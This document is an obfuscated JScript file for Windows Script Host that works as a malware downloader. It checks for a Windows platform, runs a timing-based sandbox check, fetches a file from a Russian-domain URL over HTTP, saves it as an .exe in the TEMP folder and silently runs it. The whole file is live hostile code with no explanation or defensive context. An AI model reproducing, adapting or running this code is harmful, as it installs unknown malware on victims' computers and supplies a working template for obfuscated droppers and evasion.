var OV = false;
var H = "Create"+"Object";
var F = function VC() {return WScript[H]("WScript"+".Shell");}(), JC = 11;
var E = "MSXML2"+".XMLHTTP";
var HP = 2;
var I = HP - 2;
function B(FK){F["Run"](FK, I, I);};
function T(){return E + "";};
function P(Z, K){I = I * 1; return Z - K;};
function W(){return H;};
/*@cc_on
  @if (@_win32 || @_win64)
    OV = true;
  @end
@*/
if (OV)
{
var US = "";
function ML(){return 22;};
var U = 0; var I0 = 0;
function KJ()
{
var R = new this["Date"]();
var QS = R["getUTCMilliseconds"]();
WScript["Sleep"](ML());
var R = new this["Date"]();
var O = R["getUTCMilliseconds"]();
WScript["Sleep"](ML());
var R = new this["Date"]();
var GK = R["getUTCMilliseconds"]();
var U = "X";
U = P(O, QS);
var I0 = "Q";
I0 = P(GK, O);
US = "open";
return P(U, I0);
}
var Q0 = false;
var E0 = false;
for (var V = I; V < ML() * 1; V++){if (KJ() != I){
Q0 = true; 
I0 = "31" + 11 * U + I0; 
E0 = true; 
break;
}}
function J() {return ((Q0 == true) && (Q0 == E0)) ? 1 : I;};
if (Q0 && J() && E0){
function CG() {return F["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "0IdgO26ybpkF6kK.ex" + "e";};
 N = T();
 C = WScript[H](N);
 var Y = 1;
do { 
	for (;Y;){
	try {
		if (Y == 1)
		{
			C[US]("GET", "http://bigmishki.ru/l3osjf", false);
			C["send"]();
			B0 = "Sleep";
			Y = 2;
		}
		WScript[B0](ML() + 120); 
		if (C["readystate"] < 2 * 2) continue;
		Y = I;
		function S(PR) {var ME = (1, 2, 3, 4, 5, PR); return ME;};
		U0 = WScript[W()]("ADODB.Stream");
		N = U0;
		N[US]();
		N["type"] = S(1);
		N["write"](C["ResponseBody"]);
		U0["position"] = S(I);
		N["Save" + "ToFile"](CG(), 2);
		U0["cl"+"ose"]();
		PI = CG();
		B(PI);
	} catch(FU){};};
}while (Y);
}
}

